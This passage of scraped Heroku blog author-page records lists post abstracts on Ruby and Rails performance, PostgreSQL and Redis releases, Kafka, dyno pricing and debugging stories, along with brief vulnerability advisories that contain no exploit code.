Beta news May 12, 2015 Rimas Silkaitis Developers increasingly need a variety of datastores for their projects -- no one database can serve all the needs of a modern, scalable application. For example, an e-commerce app might store its valuable transaction data in a relational database while user session information is stored in a key-value store because it changes often and needs to be accessed quickly. This is a common pattern across many app types, and the need for a key-value store is especially acute. Today, we are pleased to announce the beta of Heroku Redis , joining Heroku Postgres as our second data service. We have deep experience with Redis; internally at Heroku, we use Redis extensively as a queue, as a cache, and... Read more PostgreSQL 9.4 General Availability news April 23, 2015 Rimas Silkaitis We’re pleased to announce PostgreSQL 9.4 in general availability for Heroku Postgres. After announcing the beta earlier this year, we’ve had many developers provision databases against this new version. Throughout the beta period, developers raved about the new data type along with the performance enhancements to materialized views. This uptake by early adopters demonstrates an interest in everything that the new version of PostgreSQL provides, from features to performance. New Features and Performance Updates One of the most notable new features of 9.4 is the JSONB data type . While the text-based JSON data type has existed in PostgreSQL for some time, JSONB is a binary storage format... Read more PG Backups Levels Up news March 11, 2015 Rimas Silkaitis Performing a backup is one of those tasks that ensures your application can recover from database or hardware failures should they ever occur. Over four year ago, we recognized this as a best practice and came out with PGBackups, an add-on that reduces the risk and complexity of taking database backups. Today, we’re pleased to announce two big improvements: enhanced reliability, and the ability to schedule backups. Better By Default One of the main drivers for the upgrade was the occasional backup stall experienced by users. In some cases, PGBackups would encounter a bug that resulted in degraded performance of the database while a backup was being taken. This had adverse effects for... Read more", "date": "2017-08-08,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "Jennifer Hooper", "Sally Vedros", "Raul Murciano", "Charlie Gleason", "Kimberly Lowe-Williams", "David Routen", "Caleb Hearth", "Christie Fidura"], "link": "https://blog.heroku.com/authors/raul-murciano", "abstract": "Black Lives Matter: Our Thoughts, Actions, and Resources life June 29, 2020 Jennifer Hooper , Sally Vedros , Raul Murciano , Charlie Gleason , Kimberly Lowe-Williams , David Routen , Caleb Hearth and Christie Fidura It is never easy to know how to react, communicate, or at times, even feel, during something as heartbreaking and real as the struggles that our fellow humans face through no fault of their own. As Herokai, we stand in solidarity with the Black Lives Matter movement and want to share some of our thoughts on the struggle, as well as some actions and resources that we find helpful. We will be keeping this post updated and would love to include your voice. Please send us any thoughts that you’d like to share at: feedback@heroku.com . “Many, if not all, of us are watching the civil rights movement taking place around the world. We are hurting, we are angry, and many of us are asking, “How... Read more", "date": "2020-06-29,"},
{"website": "Heroku", "title": " ", "author": ["https://schneems.com", "Email", "Twitter", "GitHub", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman", "Richard Schneeman"], "link": "https://blog.heroku.com/authors/richard-schneeman", "abstract": "The Life-Changing Magic of Tidying Ruby Object Allocations engineering September 16, 2020 Richard Schneeman Your app is slow. It does not spark joy. This post will use memory allocation profiling tools to discover performance hotspots, even when they're coming from inside a library. We will use this technique with a real-world application to identify a piece of optimizable code in Active Record that ultimately leads to a patch with a substantial impact on page speed. In addition to the talk, I've gone back and written a full technical recap of each section to revisit it any time you want without going through the video. I make heavy use of theatrics here, including a Japanese voiceover artist, animoji, and some edited clips of Marie Kondo's Netflix TV show. This recording was done... Read more A Fast Car Needs Good Brakes: How We Added Client Rate Throttling to the Platform API Gem engineering July 07, 2020 Richard Schneeman When API requests are made one-after-the-other they'll quickly hit rate limits and when that happens: If you provide an API client that doesn't include rate limiting, you don't really have an API client. You've got an exception generator with a remote timer. — Richard Schneeman  Stay Inside (@schneems) June 12, 2019 That tweet spawned a discussion that generated a quest to add rate throttling logic to the platform-api gem that Heroku maintains for talking to its API in Ruby. If the term \"rate throttling\" is new to you, read Rate limiting, rate throttling, and how they work together The Heroku API uses Genetic Cell Rate Algorithm (GCRA) as described by... Read more Ruby 2.7.0 Holiday Release news December 25, 2019 Richard Schneeman When Heroku launched in 2007 there was only a single Ruby version that could be used on the platform. In 2012 Heroku began to support multiple Ruby versions . Since then, we've had a holiday tradition of releasing the new versions of Ruby on the same day they come out, which always happens on Christmas day (December 25th). If you're new to the community, you might be curious about where releasing a new minor version on Christmas comes from. To help answer that question, we interviewed Matz's, who works as the Chief Ruby Architect at Heroku in 2015. In his own words: Ruby was originally my pet project, my side project. So releases usually happened during my holiday time. Now,... Read more The Curious Case of the Table-Locking UPDATE Query engineering December 18, 2019 Richard Schneeman Update: On closer inspection, the lock type was not on the table, but on a tuple. For more information on this locking mechanism see the internal Postgresql tuple locking documentation . Postgres does not have lock promotion as suggested in the debugging section of this post. I maintain an internal-facing service at Heroku that does metadata processing. It's not real-time, so there's plenty of slack for when things go wrong. Recently I discovered that the system was getting bogged down to the point where no jobs were being executed at all. After hours of debugging, I found the problem was an UPDATE on a single row on a single table was causing the entire table to lock, which... Read more Puma 4: Hammering Out H13s—A Debugging Story engineering July 12, 2019 Richard Schneeman For quite some time we've received reports from our larger customers about a mysterious H13 - Connection closed error showing up for Ruby applications. Curiously it only ever happened around the time they were deploying or scaling their dynos. Even more peculiar, it only happened to relatively high scale applications. We couldn't reproduce the behavior on an example app. This is a story about distributed coordination, the TCP API, and how we debugged and fixed a bug in Puma that only shows up at scale. Connection closed First of all, what even is an H13 error? From our error page documentation: This error is thrown when a process in your web dyno accepts a connection, but then... Read more Debugging in Ruby—Busting a Year-old Bug in Sprockets engineering February 26, 2019 Richard Schneeman Debugging is an important skill to develop as you work your way up to more complex projects. Seasoned engineers have a sixth sense for squashing bugs and have built up an impressive collection of tools that help them diagnose and fix bugs. I'm a member of Heroku’s Ruby team and creator of CodeTriage and today we’ll look at the tools that I used on a journey to fix a gnarly bug in Sprockets . Sprockets is an asset packaging system written in Ruby that lies at the heart of Rails’ asset processing pipeline. At the end of the post, you will know how Sprockets works and how to debug in Ruby. Unexpected Behavior in Sprockets Sprockets gives developers a convenient way to compile, minify,... Read more Cache Invalidation Complexity: Rails 5.2 and Dalli Cache Store engineering October 16, 2018 Richard Schneeman Rails applications that use ActiveRecord objects in their cache may experience an issue where the entries cannot be invalidated if all of these conditions are true: They are using Rails 5.2+ They have configured config.active_record.cache_versioning = true They are using a cache that is not maintained by Rails, such as dalli_store (2.7.8 or prior) In this post, we discuss the background to a change in the way that cache keys work with Rails, why this change introduced an API incompatibility with 3rd party cache stores, and finally how you can find out if your app is at risk and how to fix it. Even if you're not at Rails 5.2 yet, you'll likely get there one day. It's... Read more Rails Asset Pipeline Directory Traversal Vulnerability (CVE-2018-3760) engineering June 19, 2018 Richard Schneeman All previously released versions of Sprockets , the software that powers the Rails asset pipeline, contain a directory traversal vulnerability . This vulnerability has been assigned CVE-2018-3760 . How do I know if I'm affected? Rails applications are vulnerable if they have this setting enabled in their application: # config/environments/production.rb config.assets.compile = true # setting to true makes your app vulnerable Note: The default value of this setting that ships with Rails in production.rb is false . By default, Rails apps running in production mode are not vulnerable to this exploit. How do I fix it? To remediate this vulnerability, applications can either change the... Read more Rails 5.2 Active Storage: Previews, Poppler, and Solving Licensing Pitfalls engineering May 10, 2018 Richard Schneeman Rails 5.2 was just released last month with a major new feature: Active Storage. Active Storage provides file uploads and attachments for Active Record models with a variety of backing services (like AWS S3). While libraries like Paperclip exist to do similar work, this is the first time that such a feature has been shipped with Rails. At Heroku, we consider cloud storage a best practice, so we've ensured that it works on our platform. In this post, we'll share how we prepared for the release of Rails 5.2, and how you can deploy an app today using the new Active Storage functionality. Trust but Verify At Heroku, trust is our number one value. When we learned that Active Storage... Read more Using Heroku's Expensive Query Dashboard to Speed up your App news July 11, 2017 Richard Schneeman I recently demonstrated how you can use Rack Mini Profiler to find and fix slow queries . It’s a valuable tool for well-trafficked pages, but sometimes the slowdown is happening on a page you don't visit often, or in a worker task that isn't visible via Rack Mini Profiler. How can you find and fix those slow queries? Heroku has a feature called expensive queries that can help you out. It shows historical performance data about the queries running on your database: most time consuming, most frequently invoked, slowest execution time, and slowest I/O. Recently, I used this feature to identify and address some slow queries for a site I run on Heroku named CodeTriage (the best way to... Read more N+1 Queries or Memory Problems: Why not Solve Both? news March 28, 2017 Richard Schneeman This post is going to help save you money if you're running a Rails server. It starts like this: you write an app. Let's say you're building the next hyper-targeted blogging platform for medium length posts. When you login, you see a paginated list of all of the articles you've written. You have a Post model and maybe for to do tags, you have a Tag model, and for comments, you have a Comment model. You write your view so that it renders the posts: <% @posts.each do |post| %> <%= link_to(post, post.title) %> <%= teaser_for(post) %> <%= \"#{post.comments.count} comments\" <% end %> <%= pagination(@posts) %> See any problems with... Read more Bundler Changed Where Your Canonical Ruby Information Lives: What You Need to Know news February 28, 2017 Richard Schneeman Heroku bumped its Bundler version to 1.13.7 almost a month ago, and since then we've had a large number of support tickets opened, many a variant of the following: Your Ruby version is <X>, but your Gemfile specified <Y> I wanted to talk about why you might get this error while deploying to Heroku, and what you can do about it, along with some bonus features provided by the new Bundler version. Why? First off, why are you getting this error? On Heroku in our Ruby Version docs , we mention that you can use a Ruby directive in your Gemfile to specify a version of Ruby. For example if you wanted 2.3.3 then you would need this: # Gemfile ruby \"2.3.3\" This is still... Read more Container-Ready Rails 5 news May 02, 2016 Richard Schneeman Rails 5 will be the easiest release ever to get running on Heroku. You can get it going in just five lines: $ rails new myapp -d postgresql $ cd myapp $ git init . ; git add . ; git commit -m first $ heroku create $ git push heroku master These five lines (and a view or two) are all you need to get a Rails 5 app working on Heroku — there are no special gems you need to install, or flags you must toggle. Let's take a peek under the hood, and explore the interfaces baked right into Rails 5 that make it easy to deploy your app on any modern container-based platform. Production Web Server as the Default Before Rails 5, the default web server that you get when you run $ rails server is... Read more Speeding up Sprockets engineering February 21, 2016 Richard Schneeman The asset pipeline is the slowest part of deploying a Rails app. How slow? On average, it's over 20x slower than installing dependencies via $ bundle install . Why so slow? In this article, we're going to take a look at some of the reasons the asset pipeline is slow and how we were able to get a 12x performance improvement on some apps with Sprockets version 3.3+ . The Rails asset pipeline uses the sprockets library to take your raw assets such as javascript or Sass files and pre-build minified, compressed assets that are ready to be served by a production web service. The process is inherently slow. For example, compiling Sass file to CSS requires reading the file in, which... Read more Upgrading to Rails 5 Beta - The Hard Way news January 22, 2016 Richard Schneeman Rails 5 has been brewing for more than a year. To take advantage of new features, and stay on the supported path, you'll need to upgrade. In this post, we'll look at the upgrade process for a production Rails app, codetriage.com . The codebase is open source so you can follow along . Special thanks to Prathamesh for his help with this blog post. How Stable is the Beta? In Rails a beta means the API is not yet stable, and features will come and go. A Release Candidate (RC) means no new features; the API is considered stable, and RCs will continue to be released until all reported regressions are resolved. Should you run your production app on the beta? There is value in getting a... Read more Patching Rails Performance engineering August 05, 2015 Richard Schneeman In a recent patch we improved Rails response time by >10% , our largest improvement to date. I'm going to show you how I did it, and introduce you to the tools I used, because.. who doesn’t want fast apps? In addition to a speed increase, we see a 29% decrease in allocated objects. If you haven't already, you can read or watch more about how temporary allocated objects affect total memory use . Decreasing memory pressure on an app may allow it to be run on a smaller dyno type, or spawn more worker processes to handle more throughput. Let's back up though, how did I find these optimizations in Rails in the first place? A year ago Heroku added metrics to the application... Read more Debugging Super Methods with Ruby 2.2 engineering January 13, 2015 Richard Schneeman Debugging a large codebase is hard. Ruby makes debugging easier by exposing method metadata and caller stack inside Ruby's own process. Recently in Ruby 2.2.0 this meta inspection got another useful feature by exposing super method metadata . In this post we will look at how this information can be used to debug and why it needed to be added. Read more Benchmarking Rack Middleware engineering November 02, 2014 Richard Schneeman Performance is important, and if we can't measure something, we can't make it fast. Recently, I've had my eye on the ActionDispatch::Static middleware in Rails. This middleware gets put at the front of your stack when you set config.serve_static_assets = true in your Rails app. This middleware has to compare every request that comes in to see if it should render a file from the disk or return the request further up the stack. This post is how I was able to benchmark the middleware and give it a crazy speed boost. Read more A Patch in Time: Securing Ruby news December 05, 2013 Richard Schneeman There have been thousands of reported security vulnerabilities in 2013 alone, often with language that leaves it unclear if you're affected. Heroku's job is to ensure you can focus on building your functionality, as part of that we take responsibility for the security of your app as much as we're able. On Friday, November 22nd a security vulnerability was disclosed in Ruby (MRI): CVE-2013-4164 . Our team moved quickly to identify the risk to anyone using the Heroku platform and push out a fix. The vulnerability The disclosed Ruby vulnerability contains a denial-of-service vector with the possibility of arbitrary code execution as it involves a heap overflow . In a... Read more Ruby 2.0.0 Now Default on All New Ruby Applications news June 17, 2013 Richard Schneeman Heroku provides an opinionated platform in order to help you build better applications. We give you a default version of Ruby to get you started, and give you a way to declare your version for total control. In the past creating an application would give you 1.9.2, starting today the default is 2.0.0. Ruby 2.0.0 is fast, stable, and works out of the box with Rails 4. Applications running on 2.0.0 will have a longer shelf life than 1.9.3, giving you greater erosion resistance . Default Behavior If you have a previously deployed app it will continue to use Ruby 1.9.2, any new applications will run on 2.0.0. Heroku is an erosion resistant platform, which means we will not change a major or... Read more Empowering Change: Programming Literacy for All news April 12, 2013 Richard Schneeman There has never been a better time to be a programmer. Every day more and more gadgets get connected or over-clocked . Programming is so prevalent that it often goes unnoticed in our daily lives. Whether we're scripting out social presence with IFTTT , or doing taxes with Excel, automation and programming has become an inescapable part of the modern world. Heroku believes that to invest in our future, we must invest in programming literacy . While we're waiting for recursion to be a staple in our children’s classrooms, we can work on continuing and higher education today. Heroku engineers are given opportunities and encouragement to be part of this movement. They’ve done so through... Read more Adding Concurrency to Rails Apps with Unicorn news February 26, 2013 Richard Schneeman With support for Node.js, Java, Scala and other multi-threaded languages, Heroku allows you to take full advantage of concurrent request processing and get more performance out of each dyno. Ruby should be no exception. If you are running Ruby on Rails with Thin, or another single-threaded server, you may be seeing bottlenecks in your application. These servers only process one request at a time and can cause unnecessary queuing. Instead, you can improve performance by choosing a concurrent server such as Unicorn which will make your app faster and make better use of your system resources. In this article we will explore how Unicorn works, how it gives you more processing power, and how... Read more Run JRuby on Heroku Right Now news December 13, 2012 Richard Schneeman Over a year ago Heroku launched the Cedar stack and the ability to run Java on our platform . Java is known as a powerful language - capable of performing at large scale. Much of this potential comes from the JVM that Java runs on. The JVM is the stable, optimized, cross-platform virtual machine that also powers other languages including Scala and Clojure. Starting today you can leverage the power of the JVM in your Ruby applications without learning a new language, by using JRuby on Heroku. After a beta process with several large production applications, we are pleased to move JRuby support into general availability immediately. One of these companies Travis CI which provides free CI... Read more Hacking mruby onto Heroku news November 06, 2012 Richard Schneeman If you're in the Ruby world, you've likely heard about mruby , Matz's latest experimental Ruby implementation. What I bet you didn't know is that you can run mruby on Heroku right now. As a matter of fact you can run just anything on Heroku, as long as it can compile it into a binary on a Linux box. If you're new to mruby, or to compiling binaries take a look at my last article Try mruby Today . I cover getting mruby up and running on your local machine. If you are already up to speed then follow along as we use vulcan to package mruby as binary, wrap it up in a custom buildpack and then launch an app to use mruby on the Heroku cloud. Continue Reading ... Yesterday If... Read more Ruby 2.0 Preview Available on Heroku news November 05, 2012 Richard Schneeman When Heroku first launched you could only use one version of Ruby: 1.8.6. As the Ruby implementation matured and improved, so did Heroku. We recently announced the ability to specify your ruby version on Heroku , and we are happy to announce the first preview-build of Ruby available: starting today you can use Ruby 2.0 preview1 on Heroku. Ruby 2.0 The Ruby core team has been hard at work on Ruby 2.0, which has a host of new features and boasts performance improvements. You can get a list of the major new features on the official Ruby 2.0.0 Preview1 announcement . Heroku has been committed to the Ruby project by sponsoring the work of Yukihiro \"Matz\" Matsumoto , Koichi Sasada and... Read more Sunsetting the Argent Aspen Stack news October 02, 2012 Richard Schneeman Heroku's Aspen stack is the product that launched our company and inspired a new class of cloud services. After much deliberation and careful thought, we have decided to sunset the Aspen stack by Thursday, November 22nd . We ask application owners still using Aspen to migrate to Cedar . Since Aspen's launch over four years ago, Rails has seen the introduction of Bundler for dependency management, the asset pipeline, and a major framework re-write. Heroku has also grown, and with the introduction of the Cedar stack, we have moved beyond our humble origins and have become a true polyglot platform . The Aspen stack was a prototype that served as a living vision of what a platform that... Read more Sunsetting and Deprecation at Heroku news September 24, 2012 Richard Schneeman Software erosion is what happens to your app without your knowledge or consent: it was working at one point, and then doesn't work anymore. When this happens you have to invest energy diagnosing and resolving the problem. Over a year ago Heroku's CTO, Adam Wiggins, first wrote about erosion-resistance on Heroku. Part of erosion-resistance is communication, and knowing what to expect moving into the future. This post will clarify what we mean by erosion-resistance, and help you understand what to expect when one of our features is deprecated or is sunset. Erosion Resistance Erosion-resistance means that your apps are protected against accidental or unannounced changes because... Read more Multiple Ruby Version Support on Heroku news May 09, 2012 Richard Schneeman Maximizing parity between development and production environments is a best practice for minimizing surprises at deployment time. The version of language VM you're using is no exception. One approach to this is to specify it using the same dependency management tool used to specify the versions of libraries your app uses. Clojure uses this technique with Leinigen , Scala with SBT , and Node.js with NPM . In each case, Heroku reads the dependency file during slug compile and uses the version of the language that you specify. Today, we're pleased to announce that we've added support for specifying a Ruby version to Gem Bundler , the dependency management tool for Ruby. This will... Read more Matz Named 2011 Free Software Award Winner news March 30, 2012 Richard Schneeman We are pleased to announce that Yukihiro \"Matz\" Matsumoto , the creator of Ruby and Heroku's Chief Ruby Architect , has received the 2011 annual Advancement of Free Software Award. Read more", "date": "2020-09-16,"},
{"website": "Heroku", "title": null, "author": ["Twitter", "GitHub", "LinkedIn", "Rand Fitzpatrick", "Rand Fitzpatrick", "Rand Fitzpatrick", "Rand Fitzpatrick", "Rand Fitzpatrick"], "link": "https://blog.heroku.com/authors/rand-fitzpatrick", "abstract": "Kafka Everywhere: New Plans and Pricing for Apache Kafka on Heroku news September 14, 2017 Rand Fitzpatrick Event-driven architectures are on the rise, in response to fast-moving data and constellations of inter-connected systems. In order to support this trend, last year we released Apache Kafka on Heroku - a gracefully integrated, fully managed, and carefully optimized element of Heroku's platform that is the culmination of years of experience of running many hundreds of Kafka clusters in production and contributing code to the Kafka ecosystem. Today, we are excited to announce additional plans and pricing in our Kafka offering in order to make Apache Kafka more accessible, and to better support development, testing, and low volume production needs. Read more Apache Kafka on Heroku is Now Generally Available news September 28, 2016 Rand Fitzpatrick Many of the compelling and engaging application experiences we enjoy every day are powered by event-based systems; requesting a ride and watching its progress, communicating with a friend or large group in real time, or connecting our increasingly intelligent devices to our phones and each other. Behind the scenes, similar architectures let developers connect separate services into single systems, or process huge data streams to generate real-time insights. Together, these event-driven architectures and systems are quickly becoming a powerful complement to the relational database and app server models that have been at the core of Internet applications for over twenty years. At Heroku, we... Read more Announcing Heroku Kafka Early Access news April 26, 2016 Rand Fitzpatrick Today we are happy to announce early access to Heroku Kafka . We think Kafka is interesting and exciting because it provides a powerful and scalable set of primitives for reasoning about, building, and scaling systems that can handle high volumes and velocities of data. Heroku Kafka makes Kafka more accessible, reliable, and easy to integrate into your applications. What is Kafka? Apache Kafka is a distributed commit log for fast, fault-tolerant communication between producers and consumers using message based topics. Kafka provides the messaging backbone for building a new generation of distributed applications capable of handling billions of events and millions of transactions. At... Read more New Heroku Dashboard and Metrics now in Beta news August 05, 2014 Rand Fitzpatrick At Heroku, we’re focused on delivering thoughtfully designed systems to improve developer productivity and experience. We firmly believe that improving the development and operations experience helps developers to build and run better apps. This improvement allows developers to focus more on functionality, and businesses to focus more on the value of their applications. Today we are pleased to announce two new features, both in public beta, that support this mission: a new Heroku Dashboard and Heroku Metrics. These new systems bring developers powerful new clarity and simplicity around application management, execution, and optimization. New Heroku Dashboard: Managing applications,... Read more WebSockets now Generally Available news July 07, 2014 Rand Fitzpatrick WebSocket support was introduced as a Labs feature last year, and we went through extensive testing and a number of technical iterations to improve performance and to provide a predictable compliance target . Thanks to great interaction with the community and early feature users, we now have a fast and robust solution available in production. Why WebSockets WebSockets provide bi-directional and full-duplex channels, allowing you to create applications with support for streaming, flexible protocols, and persistent connections. Getting Started with New Apps If you are creating a new application on Heroku, there is no need to enable WebSockets or to configure your application to use the... Read more", "date": "2017-09-14,"},
{"website": "Heroku", "title": null, "author": ["Email", "Randall Degges"], "link": "https://blog.heroku.com/authors/randall-degges", "abstract": "Scaling ipify to 30 Billion Requests and Beyond on Heroku engineering January 23, 2018 Randall Degges The following is the story of how Randall Degges created a simple API to solve the common problem of external IP address lookup and how he scaled it from zero to over 10 thousand requests per second (30B/month!) using Node.js and Go on Heroku. Several years ago I created a free web service, ipify . It is a highly scalable IP address lookup service. When you make a GET request against it, it returns your public-facing IP address. Try it out yourself! I created ipify because, at the time, I was building complex infrastructure... Read more", "date": "2018-01-23,"},
{"website": "Heroku", "title": null, "author": ["Email", "Philipe Navarro"], "link": "https://blog.heroku.com/authors/philipe-navarro", "abstract": "Heroku CLI: Completing Autocomplete engineering June 12, 2018 Philipe Navarro The CLI Team at Heroku strives to create a CLI user experience that is intuitive and productive. We had “build CLI autocomplete” in the icebox of our roadmap for many years. But if we were going to ship it, it had to complement the existing CLI experience. This is challenging because the Heroku CLI is very dynamic: it comprises user installable plugins, and the data needed for completions is behind an API. Recently, we spent some time brainstorming the experience we wanted from Heroku CLI Autocomplete and decided it was time. We took “build autocomplete” out of the icebox and shipped it . This post will discuss the main challenges we faced building Heroku CLI Autocomplete and how we solved... Read more", "date": "2018-06-12,"},
{"website": "Heroku", "title": null, "author": ["Peter van Hardenberg", "Peter van Hardenberg", "Peter van Hardenberg", "Peter van Hardenberg", "Peter van Hardenberg", "Peter van Hardenberg"], "link": "https://blog.heroku.com/authors/peter-van-hardenberg", "abstract": "New Dynos and Pricing Are Now Generally Available news June 15, 2015 Peter van Hardenberg Today we are announcing that Heroku’s new dynos are generally available. This new suite of dynos gives you an expanded set of options and prices when it comes to building apps at any scale on Heroku, no matter whether you’re preparing for traffic from Black Friday shoppers or deploying your first lines of code. Thanks to everyone who participated in the beta and provided feedback and bug reports. What does this mean for you? Beginning today, all new applications will run using these new dynos. You can migrate your existing paid applications to the new dynos at any convenient time until January 31, 2016, when we will sunset the traditional dynos. We will begin migrating free applications... Read more New Dyno Types and Pricing Public Beta news May 07, 2015 Peter van Hardenberg Today, we’re introducing a suite of new dynos. These dynos introduce new capabilities and price points and reduce the cost of scaling businesses on Heroku. These new dynos enter beta today. We’ve always provided a developer experience so you can create amazing apps, from hacking on new technologies and personal projects to building production applications and the most demanding high traffic apps. As Heroku has evolved, you’ve asked us for more choices when it comes to features and pricing to better match how you’re using the platform. Customers with demanding production applications have asked us for professional features and prices that better support them as they scale. At the other... Read more Heroku’s Free (as in beer) Dynos news May 07, 2015 Peter van Hardenberg Heroku comes from and is built for the developer community; the values of experimentation, openness and accessibility have been part of the product from day one, and continue to drive its development. From our first days, we have provided a free tier that followed in the tradition of making it as easy and fun as possible for developers to learn and play, discover new technologies, and build new apps — and that's not changing. It's as rewarding to us today as it was seven years ago to see experienced developers, students and hobbyist hackers use Heroku in that spirit every day. Free services have, and will continue to be, a key part of Heroku’s offering. Today we are announcing the... Read more Share your Heroku Postgres data with the new Dataclips news January 13, 2015 Peter van Hardenberg The most successful teams use their data to make the best decisions. We built Dataclips to allow your team to better share, reason about, and ask questions of the data you keep in Heroku Postgres. Heroku Dataclips are a lightweight data sharing tool that lets you take advantage of your organization’s most valuable asset. Dataclips were inspired by a set of collaboration tools we love like Google Docs and GitHub’s gists. We use tools like these every day to share everything from drafts of blog posts to snippets of code. The problem was that when we used them to share data it became stale the moment we hit the \"paste\" button. Even worse, when we’d go back to refresh that data... Read more PostgreSQL 9.4 Now Available on Heroku news January 08, 2015 Peter van Hardenberg Each major release of PostgreSQL brings lots of great new functionality. The recent release of PostgreSQL 9.4 includes an exciting new JSON data type, improvements to window functions, materialized views, and a host of other performance improvements and enhancements. We’ll go into more depth on what’s new and exciting in this release below, but first, we want you to know that Postgres 9.4 is available in beta right now on Heroku: $ heroku addons:add heroku-postgresql --version=9.4 Because the safety and reliability of your data is incredibly important to us, we’re launching 9.4 support in a beta state. This means that customers looking to follow the bleeding edge and get the first access... Read more PostgreSQL 9.1 Now Default news March 01, 2012 Peter van Hardenberg We're constantly involved in improving Postgres on behalf of our users. That kind of work includes building new features into our platform like data clips, tracking down bugs uncovered by our users and getting them fixed, and working to bring the needs of our users to the attention of the developer community driving the project forward. Of course, all that pales in comparison to the work the community does every day, and there's no bigger demonstration of that than the major PostgreSQL releases which introduce new features and generally come out once a year. When they do, we build support for that version almost immediately, and roll it out to gradually larger audiences as we... Read more", "date": "2015-06-15,"},
{"website": "Heroku", "title": null, "author": ["Peter Cho", "Peter Cho"], "link": "https://blog.heroku.com/authors/peter-cho", "abstract": "Migrating from the Mandrill Add-on news March 01, 2016 Peter Cho Last week MailChimp announced that they are shutting down the Mandrill Heroku Add-on, giving users until April 27th to migrate to another solution. Many of our customers have sought guidance on how and where to migrate, so we have asked our email providers to create guides for migrating from the Mandrill add-on to their respective services. Mailgun : Migrating from the Heroku Mandrill Add-on to the Mailgun Add-on Postmark : Migrating your Mandrill Heroku Add-on to Postmark SendGrid : Replacing the Mandrill Heroku Add-on with the SendGrid Add-on SparkPost : Migrating from Mandrill to SparkPost on Heroku Read more Running Parse on Heroku news February 04, 2016 Peter Cho Three months ago we announced that Parse would be opening their Cloud Code product so that their customers would be able to deploy their mobile backends to Heroku. This allowed Parse customers to use a full Node.js environment with Cloud Code. With Parse’s recent announcement , we’re taking that one step further, by allowing you to deploy your own Parse API server to Heroku. What this means for developers is that you will now be able to run all of your Parse services on Heroku, taking advantage of Heroku’s scalable platform as well as Heroku features like Pipelines, Review Apps, and GitHub Sync . Beyond that, because the Parse Server is now open source, you will also be able to extend and... Read more", "date": "2016-03-01,"},
{"website": "Heroku", "title": null, "author": ["Pedro Belo"], "link": "https://blog.heroku.com/authors/pedro-belo", "abstract": "Improved production stability with circuit breakers engineering June 29, 2015 Pedro Belo Fun fact: the Heroku API consumes more endpoints than it serves. Our availability is heavily dependent on the availability of the services we interact with, which is the textbook definition of when to apply the circuit breaker pattern . And so we did: Circuit breakers really helped us keep the service stable despite third-party interruptions, as this graph of p95 HTTP queue latency shows. Here I'll cover the benefits, challenges and lessons learned by introducing this pattern to a large scale production app. A brief reminder that everything fails Our API composes over 20 services – some public (S3, Twilio), some internal (run a process, map DNS record to an app) and some provided... Read more", "date": "2015-06-29,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "LinkedIn", "Owen Ou", "Chris Castle", "Owen Ou"], "link": "https://blog.heroku.com/authors/owen-ou", "abstract": "Building a GraphQL API in JavaScript engineering June 24, 2020 Owen Ou and Chris Castle Over the last few years, GraphQL has emerged as a very popular API specification that focuses on making data fetching easier for clients, whether the clients are a front-end or a third-party. In a traditional REST-based API approach, the client makes a request, and the server dictates the response: $ curl https://api.heroku.space/users/1 { \"id\": 1, \"name\": \"Luke\", \"email\": \"luke@heroku.space\", \"addresses\": [ { \"street\": \"1234 Rodeo Drive\", \"city\": \"Los Angeles\", \"country\": \"USA\" } ] } But, in GraphQL, the client determines precisely the data it wants from the server.... Read more How We Migrated to Active Record 4 engineering November 03, 2015 Owen Ou If your application is successful, there may come a time where you’re on an unsupported version of a dependency. In the case of the Heroku Platform API , this dependency was a very old version of Active Record from many years ago. Due to the complexity involved in the upgrade, this core piece of infrastructure had been pegged at version 2.3.18, which was released in March 2013. We're happy to announce that we've overcome the challenge and are now running Active Record 4.2.4, the latest version, in production. In this post, we'll describe the technical challenges we faced in the upgrade process and take a look at how your organization could benefit from upgrading legacy software... Read more", "date": "2020-06-24,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "Owen Jacobson"], "link": "https://blog.heroku.com/authors/owen-jacobson", "abstract": "How We Found and Fixed a Filesystem Corruption Bug engineering February 15, 2017 Owen Jacobson As part of our commitment to security and support, we periodically upgrade the stack image, so that we can install updated package versions, address security vulnerabilities, and add new packages to the stack. Recently we had an incident during which some applications running on the Cedar-14 stack image experienced higher than normal rates of segmentation faults and other “hard” crashes for about five hours . Our engineers tracked down the cause of the error to corrupted dyno filesystems caused by a failed stack upgrade. The sequence of events leading up to this failure, and the technical details of the failure, are unique, and worth exploring. Background Heroku runs application... Read more", "date": "2017-02-15,"},
{"website": "Heroku", "title": null, "author": ["Noah Zoschke"], "link": "https://blog.heroku.com/authors/noah-zoschke", "abstract": "Retrospectives engineering August 13, 2014 Noah Zoschke Retrospectives are a valuable tool for software engineering teams . Heroku consistently uses retrospectives to review operational incidents , root cause problems, and generate remediation tasks to improve our systems. Increasingly we use retrospectives for another purpose: to improve teamwork and interactions on projects. Here we intentionally avoid technical discussions and focus on the emotional and human aspects of work, with the goal of creating positive insights into how to improve as a team. Read more", "date": "2014-08-13,"},
